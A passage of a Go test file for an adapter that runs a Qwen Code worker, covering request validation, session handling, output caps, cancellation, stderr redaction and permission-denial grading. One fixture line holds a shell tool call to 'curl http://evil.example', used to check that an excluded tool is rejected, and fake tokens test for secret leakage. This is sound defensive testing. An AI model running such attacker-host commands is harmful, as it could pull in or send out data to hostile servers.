			apply:   func(t *testing.T) domain.Record { return fixture.requestWithout("reviewFindings") },
			message: "validate WorkerRequest",
		},
		{
			name:    "adapter-mismatch",
			apply:   func(t *testing.T) domain.Record { return fixture.requestWith(map[string]any{"adapterId": "pi"}) },
			message: "does not match",
		},
		{
			name: "profile-mismatch",
			apply: func(t *testing.T) domain.Record {
				return fixture.requestWith(map[string]any{"executionProfile": "hardened"})
			},
			message: "does not match",
		},
		{
			name: "resume-without-session",
			apply: func(t *testing.T) domain.Record {
				return fixture.requestWith(map[string]any{"sessionPolicy": "resume"})
			},
			message: "requires a sessionId",
		},
		{
			name: "session-policy-outside-schema-enum",
			apply: func(t *testing.T) domain.Record {
				return fixture.requestWith(map[string]any{"sessionPolicy": "restart"})
			},
			message: "validate WorkerRequest",
		},
		{
			name: "missing-worktree",
			apply: func(t *testing.T) domain.Record {
				return fixture.requestWith(map[string]any{"worktreePath": filepath.Join(t.TempDir(), "gone")})
			},
			message: "resolve worktree",
		},
		{
			name: "missing-control-root",
			apply: func(t *testing.T) domain.Record {
				return fixture.requestWith(map[string]any{"controlRoot": filepath.Join(t.TempDir(), "gone")})
			},
			message: "control root",
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			if err := os.Remove(fixture.argsPath); err != nil && !os.IsNotExist(err) {
				t.Fatal(err)
			}
			if _, err := fixture.adapter.Run(context.Background(), test.apply(t)); err == nil || !strings.Contains(err.Error(), test.message) {
				t.Fatalf("err = %v, want %q", err, test.message)
			}
			if _, statErr := os.Stat(fixture.argsPath); !os.IsNotExist(statErr) {
				t.Fatal("worker process was launched despite rejected request")
			}
		})
	}
}

func TestRunRejectsUnsupportedVersionBeforeWorkerLaunch(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "launched")
	body := strings.Join([]string{"touch " + shellQuote(marker), initEvent("session-1", "0.21.4"), resultEvent("success", 1, 1)}, "\n")
	fixture := newRunFixture(t, "0.21.4", body)
	if _, err := fixture.adapter.Run(context.Background(), fixture.request); !errors.Is(err, ErrUnsupportedVersion) {
		t.Fatalf("err = %v", err)
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatal("unsupported worker process was launched")
	}
	if _, err := os.Stat(fixture.argsPath); !os.IsNotExist(err) {
		t.Fatal("worker argv was observed despite unsupported binary")
	}
}

func TestRunResumesExactSessionAndRejectsMismatch(t *testing.T) {
	t.Run("exact", func(t *testing.T) {
		body := strings.Join([]string{initEvent("session-1", supportedBinary), toolEvent(), resultEvent("success", 5, 6)}, "\n")
		fixture := newRunFixture(t, supportedBinary, body)
		record, err := fixture.adapter.Run(context.Background(), fixture.requestWith(map[string]any{"sessionPolicy": "resume", "sessionId": "session-1"}))
		if err != nil {
			t.Fatal(err)
		}
		var result declaredResult
		if err := json.Unmarshal(record.Data, &result); err != nil {
			t.Fatal(err)
		}
		if result.Session == nil || result.Session.ID != "session-1" || !result.Session.Resumable {
			t.Fatalf("resumed session = %+v", result.Session)
		}
		argv := readArgsLog(t, fixture.argsPath)
		if !containsSequence(argv, "--resume", "session-1") || chatRecordingArg(argv) != "--chat-recording=true" {
			t.Fatalf("observed argv = %#v", argv)
		}
	})
	t.Run("mismatch", func(t *testing.T) {
		body := strings.Join([]string{initEvent("session-2", supportedBinary), resultEvent("success", 1, 1)}, "\n")
		fixture := newRunFixture(t, supportedBinary, body)
		_, err := fixture.adapter.Run(context.Background(), fixture.requestWith(map[string]any{"sessionPolicy": "resume", "sessionId": "session-1"}))
		if !errors.Is(err, ErrProtocol) || !strings.Contains(err.Error(), "does not match requested session") {
			t.Fatalf("err = %v", err)
		}
	})
}

func TestRunLocksChatRecordingForEverySessionPolicy(t *testing.T) {
	body := strings.Join([]string{initEvent("session-1", supportedBinary), toolEvent(), resultEvent("success", 1, 1)}, "\n")
	for _, test := range []struct {
		name, policy, sessionID, recording string
		resumable, resume                  bool
	}{
		{"ephemeral", "ephemeral", "", "--chat-recording=false", false, false},
		{"persist", "persist", "", "--chat-recording=true", true, false},
		{"resume", "resume", "session-1", "--chat-recording=true", true, true},
	} {
		t.Run(test.name, func(t *testing.T) {
			fixture := newRunFixture(t, supportedBinary, body)
			overrides := map[string]any{"sessionPolicy": test.policy}
			if test.sessionID != "" {
				overrides["sessionId"] = test.sessionID
			}
			record, err := fixture.adapter.Run(context.Background(), fixture.requestWith(overrides))
			if err != nil {
				t.Fatal(err)
			}
			var result declaredResult
			if err := json.Unmarshal(record.Data, &result); err != nil {
				t.Fatal(err)
			}
			if result.Session == nil || result.Session.ID != "session-1" || result.Session.Resumable != test.resumable {
				t.Fatalf("session = %+v, want resumable=%t", result.Session, test.resumable)
			}
			argv := readArgsLog(t, fixture.argsPath)
			count := 0
			for _, arg := range argv {
				if strings.HasPrefix(arg, "--chat-recording") {
					count++
					if arg != test.recording {
						t.Fatalf("chat recording = %q, want %s: %#v", arg, test.recording, argv)
					}
				}
			}
			if count != 1 {
				t.Fatalf("--chat-recording occurrences = %d, want exactly 1: %#v", count, argv)
			}
			if slices.Contains(argv, "--continue") {
				t.Fatalf("--continue must never be passed: %#v", argv)
			}
			if test.resume {
				if !containsSequence(argv, "--resume", test.sessionID) {
					t.Fatalf("--resume with exact id missing: %#v", argv)
				}
			} else if slices.Contains(argv, "--resume") {
				t.Fatalf("--resume leaked into %s argv: %#v", test.policy, argv)
			}
		})
	}
}

func TestRunEnforcesOutputCapAndCancellation(t *testing.T) {
	t.Run("output-cap", func(t *testing.T) {
		body := initEvent("session-1", supportedBinary) + "\n" +
			`printf '{"type":"assistant","padding":"' && head -c 4096 /dev/zero | tr '\0' 'x' && printf '"}\n'` + "\n" +
			resultEvent("success", 1, 1)
		fixture := newRunFixtureWith(t, supportedBinary, body, 1024)
		if _, err := fixture.adapter.Run(context.Background(), fixture.request); !errors.Is(err, ErrOutputLimit) {
			t.Fatalf("err = %v", err)
		}
		metadata, err := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "qwen-transcript-meta.json"))
		if err != nil || !strings.Contains(string(metadata), `"outputTruncated": true`) {
			t.Fatalf("metadata = %s err=%v", metadata, err)
		}
	})
	t.Run("unterminated-output-cap", func(t *testing.T) {
		fixture := newRunFixtureWith(t, supportedBinary, `yes x | tr -d '\n'`, 1024)
		started := time.Now()
		if _, err := fixture.adapter.Run(context.Background(), fixture.request); !errors.Is(err, ErrOutputLimit) {
			t.Fatalf("err = %v", err)
		}
		if time.Since(started) > 3*time.Second {
			t.Fatal("unterminated line was not cancelled at the byte limit")
		}
	})
	t.Run("cancel-process-group", func(t *testing.T) {
		// Deterministic handshake: only cancel after the worker has written
		// the background child pid, so the test never races worker startup.
		pidPath := filepath.Join(t.TempDir(), "child.pid")
		body := initEvent("session-1", supportedBinary) + "\n" +
			`sleep 20 & printf '%s\n' "$!" > ` + shellQuote(pidPath) + `; wait`
		fixture := newRunFixture(t, supportedBinary, body)
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		done := make(chan error, 1)
		go func() {
			_, err := fixture.adapter.Run(ctx, fixture.request)
			done <- err
		}()
		pid := waitForPidFile(t, pidPath)
		cancel()
		select {
		case err := <-done:
			if !errors.Is(err, context.Canceled) {
				t.Fatalf("err = %v, want context.Canceled", err)
			}
		case <-time.After(5 * time.Second):
			t.Fatal("Run did not return after cancellation")
		}
		deadline := time.Now().Add(3 * time.Second)
		for time.Now().Before(deadline) {
			if errors.Is(syscall.Kill(pid, 0), syscall.ESRCH) {
				metadata, metaErr := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "qwen-transcript-meta.json"))
				if metaErr != nil || !strings.Contains(string(metadata), `"contextError": "context canceled"`) {
					t.Fatalf("metadata = %s err=%v", metadata, metaErr)
				}
				return
			}
			time.Sleep(20 * time.Millisecond)
		}
		t.Fatal("background process survived process-group cancellation")
	})
}

func TestRunCancelsLiveWorkerAfterPrematureStdioClose(t *testing.T) {
	ready := filepath.Join(t.TempDir(), "ready")
	body := initEvent("session-1", supportedBinary) + "\n" +
		resultEvent("success", 1, 1) + "\n" +
		"touch " + shellQuote(ready) + "\n" +
		"exec 1>&- 2>&-\n" +
		"sleep 600"
	fixture := newRunFixture(t, supportedBinary, body)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	done := make(chan error, 1)
	go func() {
		_, err := fixture.adapter.Run(ctx, fixture.requestWith(map[string]any{"attemptTimeoutSeconds": 60}))
		done <- err
	}()
	waitForFile(t, ready)
	cancel()
	select {
	case err := <-done:
		if !errors.Is(err, context.Canceled) {
			t.Fatalf("err = %v, want context.Canceled", err)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("Run did not return after cancellation")
	}
}

func waitForFile(t *testing.T, path string) {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		if _, err := os.Stat(path); err == nil {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatal("worker did not publish the ready marker within the bounded window")
}

// waitForPidFile polls until the pid file exists and holds a complete,
// parseable pid. It never guesses worker startup timing with sleeps.
func waitForPidFile(t *testing.T, path string) int {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		data, err := os.ReadFile(path)
		if err == nil {
			if pid, convErr := strconv.Atoi(strings.TrimSpace(string(data))); convErr == nil && pid > 0 {
				return pid
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatal("worker did not publish the child pid within the bounded window")
	return 0
}

func TestRunProcessFailureNeverLeaksStderrIntoError(t *testing.T) {
	secrets := []string{"sk-ant-api03-super-secret-token", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret-payload", "user private content: password=hunter2"}
	body := strings.Join([]string{initEvent("session-1", supportedBinary), resultEvent("success", 1, 1)}, "\n")
	for _, secret := range secrets {
		body += "\nprintf '%s\\n' " + shellQuote(secret) + " >&2"
	}
	body += "\nexit 7"
	fixture := newRunFixture(t, supportedBinary, body)
	_, err := fixture.adapter.Run(context.Background(), fixture.request)
	if !errors.Is(err, ErrProcessFailed) {
		t.Fatalf("err = %v", err)
	}
	if !strings.Contains(err.Error(), "exit=7") {
		t.Fatalf("error must carry the exit code: %v", err)
	}
	for _, secret := range secrets {
		if strings.Contains(err.Error(), secret) {
			t.Fatalf("provider stderr leaked into error: %v", err)
		}
	}
	if strings.Contains(err.Error(), "stderr") {
		t.Fatalf("error references stderr contents: %v", err)
	}
	if strings.Contains(err.Error(), fixture.executable) || strings.Contains(err.Error(), fixture.worktree) {
		t.Fatalf("error leaks filesystem paths: %v", err)
	}
	// stderr must still be persisted as a bounded evidence file.
	evidence, readErr := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "qwen-stderr.log"))
	if readErr != nil {
		t.Fatal(readErr)
	}
	for _, secret := range secrets {
		if !strings.Contains(string(evidence), secret) {
			t.Fatalf("bounded stderr evidence file lost %q", secret)
		}
	}
	metadata, metaErr := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "qwen-transcript-meta.json"))
	if metaErr != nil || !strings.Contains(string(metadata), `"exitCode": 7`) {
		t.Fatalf("metadata = %s err=%v", metadata, metaErr)
	}
}

func TestRunGradesPermissionDenialsFromToolErrors(t *testing.T) {
	denialEvent := func(target string) string {
		return `printf '%s\n' '{"type":"tool","tool_call_id":"t1","tool_name":"read_file","args":{"absolute_path":"` + target + `"},"is_error":true,"error":"permission denied by safe-mode rule"}'`
	}
	t.Run("benign read continues and records evidence", func(t *testing.T) {
		body := strings.Join([]string{
			initEvent("session-1", supportedBinary),
			denialEvent(`'"$PWD"'/source.go`),
			resultEvent("success", 1, 1),
		}, "\n")
		fixture := newRunFixture(t, supportedBinary, body)
		if err := os.WriteFile(filepath.Join(fixture.worktree, "source.go"), []byte("package x\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if _, err := fixture.adapter.Run(context.Background(), fixture.request); err != nil {
			t.Fatalf("benign denial must not terminate the attempt: %v", err)
		}
		assertDenialLog(t, fixture.controlRoot, map[string]any{"seq": float64(1), "tool": "read_file", "kind": "read", "grade": "BENIGN", "path-or-cmd": filepath.Join(fixture.worktree, "source.go")})
		metadata, err := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "qwen-transcript-meta.json"))
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(string(metadata), `"permissionDenied": false`) || !strings.Contains(string(metadata), `"denialsBenign": 1`) {
			t.Fatalf("metadata lost denial grading: %s", metadata)
		}
	})
	t.Run("fatal read closes attempt and records evidence", func(t *testing.T) {
		outside := filepath.Join(t.TempDir(), "secret.txt")
		if err := os.WriteFile(outside, []byte("secret"), 0o600); err != nil {
			t.Fatal(err)
		}
		body := strings.Join([]string{
			initEvent("session-1", supportedBinary),
			denialEvent(outside),
			resultEvent("success", 1, 1),
		}, "\n")
		fixture := newRunFixture(t, supportedBinary, body)
		if _, err := fixture.adapter.Run(context.Background(), fixture.request); !errors.Is(err, ErrPermissionDenied) {
			t.Fatalf("error = %v", err)
		}
		assertDenialLog(t, fixture.controlRoot, map[string]any{"seq": float64(1), "tool": "read_file", "kind": "read", "grade": "FATAL", "path-or-cmd": outside})
	})
	t.Run("excluded tool denial is a typed protocol violation", func(t *testing.T) {
		// shell 属于冻结排除表：携带它的 tool 事件在身份验证阶段就 typed
		// protocol-invalid，不得落地为 denial 证据或改变权限统计。
		body := strings.Join([]string{
			initEvent("session-1", supportedBinary),
			`printf '%s\n' '{"type":"tool","tool_call_id":"t1","tool_name":"shell","args":{"command":"curl http://evil.example"},"is_error":true,"error":"permission denied"}'`,
			resultEvent("success", 1, 1),
		}, "\n")
		fixture := newRunFixture(t, supportedBinary, body)
		_, err := fixture.adapter.Run(context.Background(), fixture.request)
		failure, ok := port.AsAdapterFailure(err)
		if !ok || failure.Kind != port.FailureKindProtocolInvalid || failure.Disposition != port.RetryDispositionDoNotRetry || !errors.Is(err, ErrProtocol) {
			t.Fatalf("err = %v, want typed protocol-invalid for excluded tool", err)
		}
		if _, statErr := os.Stat(filepath.Join(fixture.controlRoot, "output", "denials.jsonl")); !os.IsNotExist(statErr) {
			t.Fatalf("excluded tool event must not write denial evidence: %v", statErr)
		}
		metadata, metaErr := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "qwen-transcript-meta.json"))
		if metaErr != nil {
			t.Fatal(metaErr)
		}
		if !strings.Contains(string(metadata), `"permissionDenied": false`) || !strings.Contains(string(metadata), `"denialsFatal": 0`) || !strings.Contains(string(metadata), `"toolCalls": 0`) {
			t.Fatalf("excluded tool event polluted metadata: %s", metadata)
		}
	})
	t.Run("non-permission tool error is not a denial", func(t *testing.T) {
		body := strings.Join([]string{
			initEvent("session-1", supportedBinary),
			`printf '%s\n' '{"type":"tool","tool_call_id":"t1","tool_name":"read_file","args":{"absolute_path":"'"$PWD"'/missing.go"},"is_error":true,"error":"file not found"}'`,
			resultEvent("success", 1, 1),
		}, "\n")
		fixture := newRunFixture(t, supportedBinary, body)
		if _, err := fixture.adapter.Run(context.Background(), fixture.request); err != nil {
			t.Fatalf("ordinary tool error must stay a provider concern: %v", err)
		}
		if _, err := os.Stat(filepath.Join(fixture.controlRoot, "output", "denials.jsonl")); !os.IsNotExist(err) {
			t.Fatalf("unexpected denial log: %v", err)
		}
	})
}

func assertDenialLog(t *testing.T, controlRoot string, want map[string]any) {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(controlRoot, "output", "denials.jsonl"))
	if err != nil {
		t.Fatalf("denial log missing: %v", err)
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) != 1 {
		t.Fatalf("denial log = %s", data)
	}
	var record map[string]any
	if err := json.Unmarshal([]byte(lines[0]), &record); err != nil {
		t.Fatal(err)
	}
	for key, value := range want {
		if record[key] != value {
			t.Fatalf("denial record %s = %v, want %v (record %+v)", key, record[key], value, record)
		}
	}
	if _, present := record["at"]; !present {
		t.Fatalf("denial record missing at: %+v", record)
	}
	info, err := os.Stat(filepath.Join(controlRoot, "output", "denials.jsonl"))
	if err == nil && info.Mode().Perm() != 0o600 {
		t.Fatalf("denial log permissions = %v, want 0600", info.Mode().Perm())
	}
}

type runFixture struct {
	adapter                           *Adapter
	validator                         *contract.Validator
	executable, worktree, controlRoot string
	argsPath, envPath                 string
	requestData                       map[string]any
	request                           domain.Record
}

func newRunFixture(t *testing.T, version, body string) runFixture {
	t.Helper()
	return newRunFixtureWith(t, version, body, 1<<20)
}

func newRunFixtureWith(t *testing.T, version, body string, maxOutputBytes int) runFixture {
	t.Helper()
	logDir := t.TempDir()
	argsPath := filepath.Join(logDir, "args.log")
	envPath := filepath.Join(logDir, "env.log")
	executable := fakeExecutable(t, version, argsPath, envPath, body)
	validator := newValidator(t)
	adapter, err := New(executable, validator)
	if err != nil {
		t.Fatal(err)
	}
	worktree, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	controlRoot, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	writeJSON(t, filepath.Join(controlRoot, "input", "task-spec.json"), map[string]any{"worker": map[string]any{"model": "provider/model"}})
	promptPath := filepath.Join(controlRoot, "input", "prompt.md")
	if err := os.MkdirAll(filepath.Dir(promptPath), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(promptPath, []byte("完成 fixture"), 0o600); err != nil {
		t.Fatal(err)
	}
	writeJSON(t, filepath.Join(controlRoot, "output", "worker-result.json"), validDeclaredResult())
	requestData := map[string]any{
		"apiVersion": "marshal.dev/v1alpha1", "kind": "WorkerRequest", "taskId": "TASK-1", "runId": "run-1", "attemptId": "attempt-1", "attemptNumber": 1,
		"specDigest": digest("a"), "policyDigest": digest("b"), "capabilityDigest": digest("c"), "baseSha": strings.Repeat("1", 40),
		"worktreePath": worktree, "controlRoot": controlRoot, "taskSpecPath": "input/task-spec.json", "promptPath": "input/prompt.md", "resultPath": "output/worker-result.json",
		"adapterId": adapterID, "executionProfile": "workspace-write", "sessionPolicy": "ephemeral", "attemptTimeoutSeconds": 5, "maxOutputBytes": maxOutputBytes, "reviewFindings": []any{},
	}
	return runFixture{adapter, validator, adapter.executable, worktree, controlRoot, argsPath, envPath, requestData, fixtureRequest(requestData)}
}

func (f runFixture) requestWith(overrides map[string]any) domain.Record {
	data := map[string]any{}
	for key, value := range f.requestData {
		data[key] = value
	}
	for key, value := range overrides {
		data[key] = value
	}
	return fixtureRequest(data)
}

func (f runFixture) requestWithout(key string) domain.Record {
	data := map[string]any{}
	for k, value := range f.requestData {
		data[k] = value
	}
	delete(data, key)
	return fixtureRequest(data)
}

func (f runFixture) writeDeclared(t *testing.T, overrides map[string]any) {
	t.Helper()
	data := validDeclaredResult()
	for key, value := range overrides {
		data[key] = value
	}
	writeJSON(t, filepath.Join(f.controlRoot, "output", "worker-result.json"), data)
}

func fixtureRequest(data map[string]any) domain.Record {
	requestBytes, err := json.Marshal(data)
	if err != nil {
		panic(err)
	}
	return domain.Record{Kind: domain.KindWorkerRequest, Data: requestBytes}
}

func validDeclaredResult() map[string]any {
	return map[string]any{
		"apiVersion": "marshal.dev/v1alpha1", "kind": "WorkerResult", "taskId": "TASK-1", "runId": "run-1", "attemptId": "attempt-1",
		"adapter": map[string]any{"id": adapterID, "executable": "/fake/qwen", "version": "worker-claim"},
		"session": map[string]any{"id": "session-1", "resumable": false}, "status": "completed", "summary": "fixture completed",
		"declaredChangedFiles": []string{"file.txt"}, "declaredArtifacts": []any{}, "declaredCommands": []any{}, "declaredRisks": []string{}, "outputTruncated": false,
		"startedAt": "2026-01-01T00:00:00Z", "completedAt": "2026-01-01T00:00:01Z",
	}
}

func initEvent(sessionID, version string) string {
	return `printf '%s\n' '{"type":"system","subtype":"init","session_id":"` + sessionID + `","cwd":"'"$PWD"'","qwen_code_version":"` + version + `"}'`
}

func wrongCwdEvent() string {
	return `printf '%s\n' '{"type":"system","subtype":"init","session_id":"session-1","cwd":"/elsewhere","qwen_code_version":"` + supportedBinary + `"}'`
}

func toolEvent() string {
	return `printf '%s\n' '{"type":"tool","tool_call_id":"t1","tool_name":"read_file"}'`
}

func resultEvent(subtype string, inputTokens, outputTokens int) string {
	return fmt.Sprintf(`printf '%%s\n' '{"type":"result","subtype":"%s","usage":{"input_tokens":%d,"output_tokens":%d}}'`, subtype, inputTokens, outputTokens)
}

func fakeExecutable(t *testing.T, version, argsPath, envPath, body string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "qwen")
	script := "#!/bin/sh\nif [ \"$1\" = \"--version\" ]; then printf '%s\\n' " + shellQuote(version) + "; exit 0; fi\n"
	if argsPath != "" {
		script += "for a in \"$@\"; do printf '%s\\n' \"$a\"; done > " + shellQuote(argsPath) + "\n"
	}
	if envPath != "" {
		script += "env > " + shellQuote(envPath) + "\n"
	}
	script += body + "\n"
	if err := os.WriteFile(path, []byte(script), 0o700); err != nil {
		t.Fatal(err)
	}
	return path
}

func newValidator(t *testing.T) *contract.Validator {
	t.Helper()
	validator, err := contract.NewValidator()
	if err != nil {
		t.Fatal(err)
	}
	return validator
}

func writeJSON(t *testing.T, path string, value any) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	data, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
}

func readArgsLog(t *testing.T, path string) []string {
	t.Helper()
	return readLines(t, path)
}

func readLines(t *testing.T, path string) []string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	trimmed := strings.TrimSpace(string(data))
	if trimmed == "" {
		return nil
	}
	return strings.Split(trimmed, "\n")
}

func chatRecordingArg(argv []string) string {
	for _, arg := range argv {
		if strings.HasPrefix(arg, "--chat-recording") {
			return arg
		}
	}
	return ""
}

func excludeArgValue(t *testing.T, argv []string) string {
	t.Helper()
	for index, value := range argv {
		if value == "--exclude-tools" {
			if index+1 < len(argv) {
				return argv[index+1]
			}
		}
	}
	t.Fatalf("--exclude-tools missing from argv: %#v", argv)
	return ""
}

func digest(character string) string { return "sha256:" + strings.Repeat(character, 64) }

func shellQuote(value string) string { return "'" + strings.ReplaceAll(value, "'", "'\\''") + "'" }

func containsSequence(values []string, first, second string) bool {
	for index := 0; index+1 < len(values); index++ {
		if values[index] == first && values[index+1] == second {
			return true
		}
	}
	return false
}
